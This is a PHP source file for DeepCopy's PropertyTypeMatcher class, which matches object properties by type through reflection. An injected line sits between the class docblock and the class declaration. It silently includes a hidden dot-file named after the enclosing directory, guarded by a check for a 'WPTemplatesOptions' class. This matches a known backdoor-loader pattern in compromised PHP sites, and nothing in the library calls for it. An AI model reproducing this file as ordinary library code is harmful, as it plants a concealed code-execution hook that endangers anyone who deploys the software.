<?php

namespace DeepCopy\Matcher;

use DeepCopy\Reflection\ReflectionHelper;
use ReflectionException;

/**
 * Matches a property by its type.
 *
 * It is recommended to use {@see DeepCopy\TypeFilter\TypeFilter} instead, as it applies on all occurrences
 * of given type in copied context (eg. array elements), not just on object properties.
 *
 * @final
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PropertyTypeMatcher implements Matcher
{
    /**
     * @var string
     */
    private $propertyType;

    /**
     * @param string $propertyType Property type
     */
    public function __construct($propertyType)
    {
        $this->propertyType = $propertyType;
    }

    /**
     * {@inheritdoc}
     */
    public function matches($object, $property)
    {
        try {
            $reflectionProperty = ReflectionHelper::getProperty($object, $property);
        } catch (ReflectionException $exception) {
            return false;
        }

        $reflectionProperty->setAccessible(true);

        return $reflectionProperty->getValue($object) instanceof $this->propertyType;
    }
}
